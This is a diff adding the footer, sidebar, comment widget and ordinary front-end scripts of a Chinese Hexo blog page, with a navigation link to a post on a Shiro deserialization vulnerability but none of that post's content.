+        <div class="article-nav-title">初始shiro反序列化漏洞</div>
+      </a>
+    
+  </nav>
+
+  
+   
+    
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2022
+        <i class="ri-heart-fill heart_icon"></i> John Doe
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Hexo"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://tvax4.sinaimg.cn/large/9156bd04ly1gzofeba4nlj208c08c3z9.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://tvax4.sinaimg.cn/large/9156bd04ly1gzofeo49ywj208c08cgmz.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
